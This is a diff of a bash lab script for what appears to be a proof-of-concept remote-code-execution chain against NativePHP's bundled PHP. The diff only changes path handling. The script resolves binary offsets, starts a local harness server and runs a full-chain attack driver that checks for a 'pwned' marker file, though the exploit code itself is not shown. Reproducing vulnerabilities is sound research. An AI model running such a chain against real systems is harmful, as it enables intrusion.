@@ -4,8 +4,9 @@
 # baked addresses; offsets via shape9_elfsyms.py RELA-scan of the bundled
 # (runner) binary; uid marker read back THROUGH the bridge via /_assets.
 set -u
-LAB=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/lab
-RECEIPTS=/mnt/c/Users/andre/Downloads/php2shell-claude/nativephp_lane/receipts
+HERE=$(cd "$(dirname "$0")" && pwd)
+LAB=$(cd "$HERE/../lab" && pwd)
+RECEIPTS=$(cd "$HERE/../receipts" && pwd)
 PHP8512=/tmp/php8512_build/plain2/sapi/cli/php
 PORT=8811
 MARKER=/tmp/pwned_nativephp_rce
@@ -15,11 +16,11 @@ rm -f "$MARKER" "$LAB/storage/framework/async/payload/"*.task "$LAB/storage/app/
       "$LAB/public/shape9_rce_receipt.txt"
 
 echo "############ elfsyms: RELA-scan of the runner binary (bundled-PHP stand-in) ############"
-python3 "$LAB/shape9_elfsyms.py" "$PHP8512" | tee "$RECEIPTS/nativephp_elfsyms.log"
+python3 "$HERE/shape9_elfsyms.py" "$PHP8512" | tee "$RECEIPTS/nativephp_elfsyms.log"
 
 echo
 echo "############ harness up (runner = shape9_runner.php, NO gdb, USE_ZEND_ALLOC=1) ############"
-LAB_RUNNER_SCRIPT=shape9_runner.php NATIVEPHP_RUNNER_PHP="$PHP8512" LAB_RUNNER_ALLOC=1 \
+NPHP_LAB="$LAB" LAB_RUNNER_SCRIPT="../shape9/shape9_runner.php" NATIVEPHP_RUNNER_PHP="$PHP8512" LAB_RUNNER_ALLOC=1 \
   "$PHP8512" -n -S "127.0.0.1:$PORT" "$LAB/harness.php" > "$LAB/server.log" 2>&1 &
 SERVER_PID=$!
 up=0
@@ -30,7 +31,7 @@ done
 if [ "$up" != 1 ]; then echo "[FAIL] server did not come up"; kill "$SERVER_PID" 2>/dev/null; exit 1; fi
 
 echo "############ full-chain attack driver (attempt loop, fresh ASLR per dispatch) ############"
-python3 "$LAB/shape9_attack.py" "http://127.0.0.1:$PORT" "$LAB" "$PHP8512" 30 \
+python3 "$HERE/shape9_attack.py" "http://127.0.0.1:$PORT" "$LAB" "$PHP8512" 30 \
   | tee "$RECEIPTS/nativephp_rce_fullchain.log"
 RC=${PIPESTATUS[0]}
 kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null
